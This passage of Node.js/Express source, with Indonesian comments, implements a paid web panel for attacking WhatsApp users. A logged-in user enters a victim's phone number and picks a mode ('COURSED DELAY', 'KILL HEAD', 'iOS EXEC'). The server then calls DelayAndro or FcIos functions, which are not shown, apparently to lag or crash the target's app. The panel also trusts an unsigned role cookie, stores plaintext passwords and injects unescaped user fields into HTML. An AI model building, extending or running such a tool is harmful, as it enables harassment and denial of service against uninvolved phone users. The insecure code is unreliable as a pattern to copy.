  <link href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
  <script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  <!-- Particles JS -->
  <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
  font-family: 'Orbitron', sans-serif;
  background: #000000; /* Warna hitam solid */
  color: #b19cd9;
  min-height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  padding: 20px;
  position: relative;
  overflow: hidden;
}
    @keyframes bgAnimation {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    /* Particles container */
    #particles {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 0;
    }
    .container {
  background: rgba(0, 0, 0, 0.7);
  border: 1px solid #9932cc;
  padding: 24px;
  border-radius: 20px;
  max-width: 420px;
  width: 100%;
  box-shadow: 0 0 16px rgba(153, 50, 204, 0.8);
  backdrop-filter: blur(10px);
  position: relative;
  z-index: 1;
}
    .logo {
  width: 80px;
  height: 80px;
  margin: 0 auto 12px;
  display: block;
  border-radius: 50%;
  box-shadow: 0 0 16px rgba(138, 43, 226, 0.8); /* Purple shadow */
  object-fit: cover;
  filter: drop-shadow(0 0 10px #8a2be2) drop-shadow(0 0 20px #8a2be2); /* Purple glow effect */
  border: 1px solid #8a2be2; /* Purple border */
}

    .username {
  font-size: 22px;
  color: #b19cd9;
  font-weight: bold;
  text-align: center;
  margin-bottom: 6px;
}
    .connected {
  font-size: 14px;
  color: #8a2be2; /* Purple text */
  margin-bottom: 16px;
  display: flex;
  justify-content: center;
  align-items: center;
  font-family: 'Poppins', sans-serif; /* Consistent font */
  text-transform: uppercase; /* If you want "CONNECTED" in all caps */
  letter-spacing: 0.5px; /* Slightly spaced letters */
}

.connected::before {
  content: '';
  width: 10px;
  height: 10px;
  background: #25ff08; /* Purple dot */
  border-radius: 50%; /* Perfect circle */
  display: inline-block;
  margin-right: 8px;
  box-shadow: 0 0 8px rgba(138, 43, 226, 0.6); /* Optional purple glow */
  animation: pulse 2s infinite; /* Optional pulse animation */
}
    input[type="text"] {
  width: 100%;
  padding: 14px;
  border-radius: 10px;
  background: #1a001a;  // Dark purple background
  border: none;
  color: #b19cd9;      // Light purple text
  margin-bottom: 16px;
}
    
    .buttons-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 12px;
      margin-bottom: 16px;
    }

    .buttons-grid button {
  padding: 2px;
  border: none;
  border-radius: 15px;
  background: #1a001a;
  color: #a020f0;
  font-weight: bold;
  cursor: pointer;
  transition: 0.3s;
}

.buttons-grid button.selected {
  background: #a020f0;
  color: #000;
}
    
    .buttons-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
      gap: 12px;
      margin-top: 20px;
    }

    .mode-btn {
  font-size: 14px;
  font-weight: 600;
  padding: 12px 16px;
  background-color: #1a001a;  // Dark purple
  color: #b19cd9;            // Light purple text
  border: 2px solid #8a2be2; // Purple border
  border-radius: 10px;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  transition: all 0.2s ease;
}

    .mode-btn i {
      font-size: 18px;
    }

    .mode-btn:hover {
  background-color: #2a004a;  // Darker purple
  transform: scale(1.03);
}

    .mode-btn.selected {
  background: #8a2be2;  // Bright purple
  color: white;
}

    .mode-btn.full {
      grid-column: span 2;
    }

    @media (max-width: 500px) {
      .mode-btn.full {
        grid-column: span 1;
      }
    }

    .execute-button {
  background: #8a2be2;  // Purple button
  color: #fff;
  padding: 14px;
  width: 100%;
  border-radius: 10px;
  font-weight: bold;
  border: none;
  margin-bottom: 12px;
  cursor: pointer;
  transition: 0.3s;
}

.execute-button:disabled {
  background: #4b0082;  // Dark purple
  cursor: not-allowed;
  opacity: 0.5;
}

.execute-button:hover:not(:disabled) {
  background: #9932cc;
}
    .footer-action-container {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      align-items: center;
      gap: 8px;
      margin-top: 20px;
    }
    .footer-button {
  background: rgba(138, 43, 226, 0.15);  // Purple tint
  border: 1px solid #8a2be2;            // Purple border
  border-radius: 8px;
  padding: 8px 12px;
  font-size: 14px;
  color: #b19cd9;                      // Light purple text
  display: flex;
  align-items: center;
  gap: 6px;
  transition: all 0.3s ease;
}

    .footer-button:hover {
  background: rgba(138, 43, 226, 0.3);  // Stronger purple
}
    .footer-button a {
  color: #b19cd9;  // Light purple links
}
  </style>
</head>
<body>
  <!-- Particles Background -->
  <div id="particles" style="position: fixed; top: 0; left: 0; right: 0; bottom: 0; z-index: 0;"></div>
  
  <div class="container">
    <div class="icon" style="text-align: center; margin-bottom: 15px;">
      <img src="https://files.catbox.moe/aorxh2.png"
           alt="Coursed Logo"
           style="width: 80px; height: 80px; filter: drop-shadow(0 0 10px #8a2be2) drop-shadow(0 0 20px #8a2be2);">
    </div>
    <div class="username">Welcome, ${username || 'Anonymous'}</div>
    <div class="connected">CONNECTED</div>

    <input type="text" placeholder="Please input target number. example : 62xxxx" />
    
    <div class="buttons-grid">
      <button class="mode-btn" data-mode="androdelay"><i class="fa fa-fire" aria-hidden="true"></i> COURSED DELAY</button>
      <button class="mode-btn" data-mode="androdelay2"><i class="fa fa-tint" aria-hidden="true"></i> COURSED KILL HEAD</button>
      <button class="mode-btn full" data-mode="iosfc"><i class="fa fa-bolt" aria-hidden="true"></i> COURSED iOS EXEC</button>
    </div>

    <button class="execute-button" id="executeBtn" disabled><i class="fas fa-rocket"></i> EXECUTE</button>

    <div class="footer-action-container">
      ${userInfo.role === "owner" || userInfo.role === "admin" ? `
        <div class="footer-button">
          <a href="/userlist">
            <i class="fas fa-users-cog"></i> Kelola User
          </a>
        </div>
      ` : ""}
      
      <div class="footer-button developer">
        <a href="https://t.me/DELION9Q" target="_blank">
          <i class="fab fa-telegram"></i> Developer
        </a>
      </div>
      <div class="footer-button logout">
        <a href="/logout">
          <i class="fas fa-sign-out-alt"></i> Logout
        </a>
      </div>
      <div class="footer-button user-info">
        <i class="fas fa-user"></i> ${username || 'Unknown'}
        &nbsp;|&nbsp;
        <i class="fas fa-hourglass-half"></i> ${formattedTime}
      </div>
    </div>
  </div>

  <script>
    // Initialize particles
    $(document).ready(function() {
      $('#particles').particleground({
  dotColor: '#ffffff',
  lineColor: '#9932cc',  // Changed from #ff0000 to purple
  minSpeedX: 0.1,
  maxSpeedX: 0.3,
  minSpeedY: 0.1,
  maxSpeedY: 0.3,
  density: 10000,
  particleRadius: 3,
});
    });

    const inputField = document.querySelector('input[type="text"]');
    const modeButtons = document.querySelectorAll('.mode-btn');
    const executeBtn = document.getElementById('executeBtn');

    let selectedMode = null;

    function isValidNumber(number) {
      const pattern = /^62\\d{7,13}$/;
      return pattern.test(number);
    }

    modeButtons.forEach(button => {
      button.addEventListener('click', () => {
        modeButtons.forEach(btn => btn.classList.remove('selected'));
        button.classList.add('selected');
        selectedMode = button.getAttribute('data-mode');
        executeBtn.disabled = false;
      });
    });

    executeBtn.addEventListener('click', () => {
      const number = inputField.value.trim();
      if (!isValidNumber(number)) {
        alert("Nomor tidak valid. Harus dimulai dengan 62 dan total 10-15 digit.");
        return;
      }
      window.location.href = '/execution?mode=' + selectedMode + '&target=' + number;
    });
  </script>
</body>
${successToast ? `<div id="exec-success-flag" style="display:none;"></div>` : ""}
<div id="toast"
     style="display:none; position:fixed; top:50%; left:50%; transform:translate(-50%, -50%);
            background:linear-gradient(145deg, #9b6dff, #6f3eff); color:#fff;
            padding:18px 36px; border-radius:16px;
            font-family:'Poppins', sans-serif; font-size:18px; font-weight:600;
            box-shadow:0 0 24px rgba(155, 109, 255, 0.7);
            z-index:9999; text-align:center; text-shadow:0 0 3px #000;">
</div>

<script>
  function showToast(message) {
    const toast = document.getElementById('toast');
    toast.innerText = message;
    toast.style.display = 'block';
    setTimeout(() => {
      toast.style.display = 'none';
    }, 3000);
  }

  window.addEventListener('DOMContentLoaded', () => {
    const successFlag = document.getElementById('exec-success-flag');
    if (successFlag) {
      showToast("🔥 Success");
    }
  });
</script>
</html>`;
};


// Appp Get root Server \\
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());


app.get("/", (req, res) => {
  const username = req.cookies.sessionUser;
  const role = req.cookies.sessionRole;

  // Jika cookie login masih aktif dan tidak expired
  if (username && role) {
    const users = getUsers();
    const user = users.find(u => u.username === username && u.role === role);

    if (user && (!user.expired || Date.now() < user.expired)) {
      return res.redirect("/execution");
    }
  }

  // Kalau belum login, tampilkan halaman login
  const filePath = path.join(__dirname, "CRSD-View", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca Login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "CRSD-View", "Login.html");

  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");

    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  const { username, password } = req.body;
  const users = getUsers();
  const user = users.find(u => u.username === username && u.password === password);

  if (!user || (user.expired && Date.now() > user.expired)) {
    return res.redirect("/login?msg=Login%20gagal%20atau%20expired");
  }

  // Cek apakah sedang login di device lain
  if (user.isLoggedIn) {
    return res.redirect("/login?msg=User%20sudah%20login%20di%20device%20lain");
  }

  // Set user sebagai login
  user.isLoggedIn = true;
    console.log(`[ ${chalk.green('LogIn')} ] -> ${user.username}`);
  saveUsers(users);

  const oneDay = 24 * 60 * 60 * 1000;

  res.cookie("sessionUser", username, { path: '/', maxAge: oneDay });
  res.cookie("sessionRole", user.role, { path: "/", maxAge: oneDay })
  return res.redirect("/execution");
});


app.get("/userlist", (req, res) => {
  const role = req.cookies.sessionRole;
  const currentUsername = req.cookies.sessionUser;

  if (!["admin", "owner"].includes(role)) {
    return res.send("🚫 Akses ditolak.");
  }

  const users = getUsers();

  const tableRows = users.map(user => {
    const isProtected = user.username === currentUsername || (role === "admin" && user.role !== "user");

    return `
      <tr>
        <td>${user.username}</td>
        <td>${user.role}</td>
        <td>${new Date(user.expired).toLocaleString("id-ID")}</td>
        <td>
          ${isProtected ? "❌" : `
            <form method="POST" action="/hapususer" style="display:inline">
              <input type="hidden" name="username" value="${user.username}" />
              <button type="submit">Hapus</button>
            </form>
          `}
          ${(role === "owner" || (role === "admin" && user.role === "user")) ? `
            <a href="/edituser?username=${user.username}">
              <button>Edit</button>
            </a>
          ` : ""}
        </td>
      </tr>
    `;
  }).join("");

  const html = `
    <html>
<head>
  <title>Daftar User</title>
  <!-- Font Awesome -->
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      background: black;
      color: #fff;
      font-family: 'Poppins', sans-serif;
      padding: 20px;
      min-height: 100vh;
      position: relative;
      overflow-x: hidden;
    }

    #particles {
      position: fixed;
      top: 0;
      left: 0;
      height: 100%;
      width: 100%;
      z-index: 0;
    }

    .content {
      position: relative;
      z-index: 2;
    }

    h2 {
      text-align: center;
      margin-bottom: 20px;
      color: #8a2be2; /* Changed to purple */
    }

    .table-container {
      overflow-x: auto;
      border: 1px solid #8a2be2; /* Changed to purple */
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(138, 43, 226, 0.5); /* Changed to purple */
      background: rgba(0, 0, 0, 0.7);
      backdrop-filter: blur(8px);
    }

    table {
      width: 100%;
      min-width: 600px;
      border-collapse: collapse;
    }

    th, td {
      padding: 12px 16px;
      text-align: left;
      border-bottom: 1px solid #8a2be2; /* Changed to purple */
      white-space: nowrap;
    }

    th {
      background: rgba(26, 0, 26, 0.8); /* Dark purple */
      color: #b19cd9; /* Light purple text */
      font-weight: bold;
    }

    td {
      background: rgba(13, 0, 13, 0.8); /* Dark purple */
    }

    button {
      background: #8a2be2; /* Purple button */
      color: white;
      border: none;
      padding: 6px 12px;
      border-radius: 6px;
      cursor: pointer;
      font-size: 13px;
      transition: 0.2s;
    }

    button:hover {
      background: #9932cc; /* Lighter purple on hover */
    }

    a button {
      margin-left: 6px;
    }

    .back-btn {
      display: block;
      margin: 20px auto;
      padding: 10px 18px;
      font-size: 14px;
      background: #4b0082; /* Dark purple */
      border-radius: 8px;
      color: #b19cd9; /* Light purple text */
      text-align: center;
      text-decoration: none;
      transition: 0.3s;
    }

    .back-btn:hover {
      background: #5a0092; /* Slightly lighter purple */
    }

    @media (max-width: 600px) {
      th, td {
        padding: 10px;
        font-size: 13px;
      }

      button {
        padding: 5px 10px;
        font-size: 12px;
      }
    }

    /* Form styles */
    #userFormContainer {
      display: none;
      transition: max-height 0.4s ease;
      overflow: hidden;
      margin-top: 16px;
      max-width: 400px;
      margin-inline: auto;
      background: rgba(26, 0, 26, 0.8); /* Dark purple */
      padding: 20px;
      border-radius: 10px;
      border: 1px solid #8a2be2; /* Purple border */
      box-shadow: 0 0 10px rgba(138, 43, 226, 0.5); /* Purple shadow */
    }

    #userFormContainer input,
    #userFormContainer select {
      padding: 12px;
      border-radius: 10px;
      border: none;
      background: #1a001a; /* Dark purple */
      color: #b19cd9; /* Light purple text */
      width: 100%;
      margin-bottom: 12px;
    }

    #userFormContainer button[type="submit"] {
      padding: 14px;
      background: #8a2be2; /* Purple button */
      color: white;
      font-weight: bold;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      width: 100%;
    }

    #toggleFormBtn {
      background: #1a001a; /* Dark purple */
      border: 1px solid #8a2be2; /* Purple border */
      color: #b19cd9; /* Light purple text */
      padding: 12px 18px;
      border-radius: 10px;
      font-weight: bold;
      font-size: 15px;
      cursor: pointer;
      transition: background 0.3s ease;
      display: block;
      margin: 0 auto;
    }

    #toggleFormBtn:hover {
      background: #2a004a; /* Darker purple */
    }
  </style>
</head>

<body>
  <div id="particles" style="position: fixed; top: 0; left: 0; right: 0; bottom: 0; z-index: 0;"></div>
  
  <div class="content">
    <h2>Daftar User</h2>

    <div class="table-container">
      <table>
        <thead>
          <tr>
            <th>Username</th>
            <th>Role</th>
            <th>Expired</th>
            <th>Aksi</th>
          </tr>
        </thead>
        <tbody>
          ${tableRows}
        </tbody>
      </table>
    </div>

    <a href="/execution" class="back-btn"><i class="fas fa-arrow-left"></i> Back To Dashboard</a>

    <div style="margin-top: 24px; text-align: center;">
      <button id="toggleFormBtn">
        <i class="fas fa-user"></i> Add New User
      </button>
    </div>

    <div id="userFormContainer">
      <form action="/adduser" method="POST">
        <input type="text" name="username" placeholder="Username" required>
        <input type="text" name="password" placeholder="Password" required>
        <input type="number" name="durasi" placeholder="Durasi (hari)" required min="1">
        <select name="role" required>
          <option value="user">User</option>
          <option value="admin">Admin</option>
          <option value="owner">Owner</option>
        </select>
        <button type="submit">Add User</button>
      </form>
    </div>
  </div>

  <!-- Particles.js -->
  <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script>
    // Toggle form visibility
    const toggleBtn = document.getElementById("toggleFormBtn");
    const formContainer = document.getElementById("userFormContainer");

    toggleBtn.addEventListener("click", () => {
      const isHidden = formContainer.style.display === "none" || formContainer.style.display === "";
      formContainer.style.display = isHidden ? "block" : "none";

      toggleBtn.innerHTML = isHidden
        ? '<i class="fas fa-arrow-left"></i> Back'
        : '<i class="fas fa-user"></i> Add New User';
    });

    // Initialize particles
    document.addEventListener('DOMContentLoaded', function () {
      particleground(document.getElementById('particles'), {
        dotColor: '#ffffff', /* Light purple dots */
        lineColor: '#8a2be2', /* Purple lines */
        minSpeedX: 0.1,
        maxSpeedX: 0.3,
        minSpeedY: 0.1,
        maxSpeedY: 0.3,
        density: 10000,
        particleRadius: 3,
      });
    }, false);
  </script>
</body>
</html>
  `;
  res.send(html);
});


// Tambahkan di bawah route lain
app.post("/adduser", (req, res) => {
  const sessionRole = req.cookies.sessionRole;
  const { username, password, role, durasi } = req.body;

  // Validasi input
  if (!username || !password || !role || !durasi) {
    return res.send("❌ Lengkapi semua kolom.");
  }

  // Cek hak akses
  if (sessionRole === "admin" && role !== "user") {
    return res.send("🚫 Admin hanya boleh buat user biasa.");
  }

  if (sessionRole === "user") {
    return res.send("🚫 User tidak bisa membuat akun.");
  }

  const users = getUsers();
  
  // Cek apakah username sudah ada
  if (users.some(u => u.username === username)) {
    return res.send("❌ Username sudah ada.");
  }

  // Hitung waktu expired
  const expired = Date.now() + parseInt(durasi) * 24 * 60 * 60 * 1000;

  // Tambahkan user baru
  users.push({
  username,
  password,
  expired,
  role,
  isLoggedIn: false
});

  saveUsers(users);
  
  // Redirect ke halaman userlist setelah berhasil
  res.redirect("/userlist");
});

app.post("/hapususer", (req, res) => {
  const sessionRole = req.cookies.sessionRole;
  const sessionUsername = req.cookies.sessionUser;
  const { username } = req.body;

  const users = getUsers();
  const targetUser = users.find(u => u.username === username);

  if (!targetUser) return res.send("❌ User tidak ditemukan.");

  if (sessionRole === "admin" && targetUser.role !== "user") {
    return res.send("❌ Admin hanya bisa hapus user biasa.");
  }

  if (sessionUsername === username) {
    return res.send("❌ Tidak bisa hapus akun sendiri.");
  }

  const filtered = users.filter(u => u.username !== username);
  saveUsers(filtered);
  res.redirect("/userlist");
});


app.get("/edituser", (req, res) => {
  const role = req.cookies.sessionRole;
  if (!["admin", "owner"].includes(role)) return res.send("🚫 Akses ditolak.");

  const username = req.query.username;
  if (!username) return res.send("❗ Username tidak valid.");

  const users = getUsers();
  const user = users.find(u => u.username === username);
  if (!user) return res.send("❌ User tidak ditemukan.");

  const now = Date.now();
  const sisaHari = Math.max(0, Math.ceil((user.expired - now) / 86400000));
  const expiredText = new Date(user.expired).toLocaleString("id-ID", {
    year: "numeric", month: "2-digit", day: "2-digit",
    hour: "2-digit", minute: "2-digit"
  });

  const html = `
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Edit User</title>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Poppins', sans-serif;
      background: #000000;
      color: #b19cd9;
      min-height: 100vh;
      padding: 20px;
      position: relative;
      overflow: hidden;
    }

    #particles {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      z-index: 0;
    }

    .content {
      position: relative;
      z-index: 2;
    }

    h2 {
      text-align: center;
      margin-bottom: 20px;
      color: #8a2be2;
      text-shadow: 0 0 8px rgba(138, 43, 226, 0.7);
    }

    .form-container {
      max-width: 480px;
      margin: 0 auto;
      background: rgba(0, 0, 0, 0.7);
      border: 1px solid #8a2be2;
      padding: 24px;
      border-radius: 16px;
      box-shadow: 0 0 20px rgba(138, 43, 226, 0.5);
      backdrop-filter: blur(8px);
    }

    label {
      display: block;
      margin-bottom: 8px;
      font-weight: 600;
      color: #b19cd9;
    }

    input, select {
      width: 100%;
      padding: 12px;
      margin-bottom: 18px;
      border-radius: 10px;
      border: none;
      background: #1a001a;
      color: #b19cd9;
      box-sizing: border-box;
    }

    .expired-info {
      margin-top: -12px;
      margin-bottom: 18px;
      font-size: 12px;
      color: #aaa;
      padding: 12px;
      background: #1a001a;
      border-radius: 10px;
      width: 100%;
      box-sizing: border-box;
    }

    button {
      width: 100%;
      padding: 14px;
      background: #8a2be2;
      color: white;
      border: none;
      border-radius: 10px;
      font-weight: bold;
      cursor: pointer;
      transition: 0.3s;
      box-sizing: border-box;
      margin-top: 10px;
    }

    button:hover {
      background: #9932cc;
      transform: scale(1.02);
    }

    .back-btn {
      display: block;
      text-align: center;
      margin-top: 20px;
      padding: 10px;
      background: #1a001a;
      color: #b19cd9;
      border: 1px solid #8a2be2;
      border-radius: 8px;
      text-decoration: none;
      transition: 0.3s;
    }

    .back-btn:hover {
      background: #2a004a;
    }

    @media (max-width: 500px) {
      body {
        padding: 16px;
      }

      .form-container {
        padding: 16px;
      }

      input, select {
        padding: 10px;
      }

      button {
        padding: 12px;
      }
    }
  </style>
</head>
<body>
  <!-- Particles Background -->
  <div id="particles"></div>
  
  <div class="content">
    <h2>Edit User: ${user.username}</h2>

    <div class="form-container">
      <form method="POST" action="/edituser">
        <input type="hidden" name="oldusername" value="${user.username}">

        <label>Username Baru:</label>
        <input type="text" name="username" value="${user.username}" required>

        <label>Password Baru:</label>
        <input type="text" name="password" value="${user.password}" required>

        <label>Expired Saat Ini:</label>
        <input type="text" value="${expiredText} - Sisa Waktu: ${sisaHari} hari lagi" disabled class="expired-info">

        <label>Perpanjang (dalam hari):</label>
        <input type="number" name="extend" min="0" value="0">

        <label>Role:</label>
        <select name="role">
          <option value="user" ${user.role === "user" ? 'selected' : ''}>User</option>
          <option value="admin" ${user.role === "admin" ? 'selected' : ''}>Admin</option>
          <option value="owner" ${user.role === "owner" ? 'selected' : ''}>Owner</option>
        </select>

        <button type="submit"><i class="fas fa-save"></i> Simpan Perubahan</button>
      </form>
    </div>

    <a href="/userlist" class="back-btn"><i class="fas fa-arrow-left"></i> Kembali ke Daftar User</a>
  </div>

  <!-- Particles JS -->
  <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script>
    // Initialize particles
    $(document).ready(function() {
      $('#particles').particleground({
        dotColor: '#ffffff',
        lineColor: '#8a2be2',
        minSpeedX: 0.1,
        maxSpeedX: 0.3,
        minSpeedY: 0.1,
        maxSpeedY: 0.3,
        density: 10000,
        particleRadius: 3,
      });
    });
  </script>
</body>
</html>
`;
  res.send(html);
});


app.post("/edituser", (req, res) => {
  const { oldusername, username, password, extend, role } = req.body;
  const sessionRole = req.cookies.sessionRole;

  if (!["admin", "owner"].includes(sessionRole)) return res.send("❌ Akses ditolak.");
  if (role === "owner" && sessionRole !== "owner") return res.send("❌ Hanya owner bisa ubah ke role owner.");

  const users = getUsers();
  const index = users.findIndex(u => u.username === oldusername);
  if (index === -1) return res.send("❌ User tidak ditemukan.");

  const now = Date.now();
  const current = users[index].expired > now ? users[index].expired : now;
  const tambahan = parseInt(extend || "0") * 86400000;

  users[index] = {
    ...users[index],
    username,
    password,
    expired: current + tambahan,
    role
  };

  saveUsers(users);
  res.redirect("/userlist");
});


app.post("/updateuser", (req, res) => {
  const { oldUsername, username, password, expired, role } = req.body;
  const sessionRole = req.cookies.sessionRole;

  if (!["admin", "owner"].includes(sessionRole)) {
    return res.send("❌ Akses ditolak.");
  }

  const users = getUsers();
  const index = users.findIndex(u => u.username === oldUsername);
  if (index === -1) return res.send("❌ Username tidak ditemukan.");

  // Ganti username & password
  users[index].username = username;
  users[index].password = password;

  // Tambah expired berdasarkan jumlah hari
  const days = parseInt(expired);
  if (!isNaN(days) && days > 0) {
    const now = Date.now();
    const currentExp = users[index].expired;
    users[index].expired = currentExp > now ? currentExp + (days * 86400000) : now + (days * 86400000);
  }

  // Role hanya bisa diubah oleh owner
  if (sessionRole === "owner" && ["user", "admin", "owner"].includes(role)) {
    users[index].role = role;
  }

  saveUsers(users);
  res.redirect("/userlist");
});


app.get("/execution", (req, res) => {
  const username = req.cookies.sessionUser;
  const msg = req.query.msg || "";
  const filePath = "./CRSD-View/Login.html";

  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");

    if (!username) return res.redirect("/login");

    const users = getUsers();
    const currentUser = users.find(u => u.username === username);

    if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
      return res.send(html);
    }

    const targetNumber = req.query.target;
    const mode = req.query.mode;
    const target = `${targetNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return res.send(executionPage("🚧 MAINTENANCE SERVER !!", {
        message: "Tunggu sampai maintenance selesai..."
      }, false, currentUser, "", mode));
    }

    if (!targetNumber) {
      if (!mode) {
        return res.send(executionPage("✅ Server ON", {
          message: "Pilih mode yang ingin digunakan."
        }, true, currentUser, "", ""));
      }

      if (["androdelay", "androdelay2", "iosfc"].includes(mode)) {
        return res.send(executionPage("✅ Server ON", {
          message: "Masukkan nomor target (62xxxxxxxxxx)."
        }, true, currentUser, "", mode));
      }

      return res.send(executionPage("❌ Mode salah", {
        message: "Mode tidak dikenali. Gunakan ?mode=androdelay atau ?mode=iosfc atau ?mode=androdelay2."
      }, false, currentUser, "", ""));
    }

    if (!/^\d+$/.test(targetNumber)) {
      return res.send(executionPage("❌ Format salah", {
        target: targetNumber,
        message: "Nomor harus hanya angka dan diawali dengan nomor negara"
      }, true, currentUser, "", mode));
    }

    try {
      if (mode === "androdelay") {
        DelayAndro(24, target);
      } else if (mode === "iosfc") {
        FcIos(24, target);
      } else if (mode === "androdelay2") {
        DelayAndro2(24, target);
      } else {
        throw new Error("Mode tidak dikenal.");
      }

      return res.send(executionPage("✅ S U C C E S", {
        target: targetNumber,
        timestamp: new Date().toLocaleString("id-ID"),
        message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()}`
      }, false, currentUser, "", mode, true));
    } catch (err) {
      return res.send(executionPage("❌ Gagal kirim", {
        target: targetNumber,
        message: err.message || "Terjadi kesalahan saat pengiriman."
      }, false, currentUser, "Gagal mengeksekusi nomor target.", mode));
    }
  });
});

app.get("/logout", (req, res) => {
  const username = req.cookies.sessionUser;
  if (!username) return res.redirect("/");

  const users = getUsers();
  const user = users.find(u => u.username === username);
  if (user) {
    user.isLoggedIn = false;
    console.log(`[ ${chalk.red('LogOut')} ] -> ${user.username}`);
    saveUsers(users);
  }

  res.clearCookie("sessionUser");
  res.clearCookie("sessionRole");
  res.redirect("/");
});

app.listen(PORT, () => {
  console.log(`${chalk.green('Server Active On Port')} ${PORT}`);
});